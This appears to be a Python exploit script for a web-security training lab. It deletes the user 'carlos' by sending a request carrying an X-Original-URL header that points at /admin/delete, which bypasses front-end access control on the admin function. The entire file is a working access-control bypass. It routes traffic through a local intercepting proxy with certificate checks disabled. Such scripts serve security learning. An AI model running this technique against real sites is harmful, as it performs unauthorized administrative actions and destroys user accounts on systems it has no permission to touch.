#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_carlos(s, url):
    delete_url = url + "/?username=carlos"
    header = {"X-Original-URL": "/admin/delete"}
    s.get(delete_url, headers=header, verify=False, proxies=proxies, allow_redirects=True)
    r = s.get(url, verify=False, proxies=proxies)
    if "Congratulations" in r.text:
        print("[+] Successfully deleted user carlos")
    else:
        print("[-] Error. Failed to delete carlos")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")
    delete_carlos(s, url)

if __name__ == "__main__":
    main()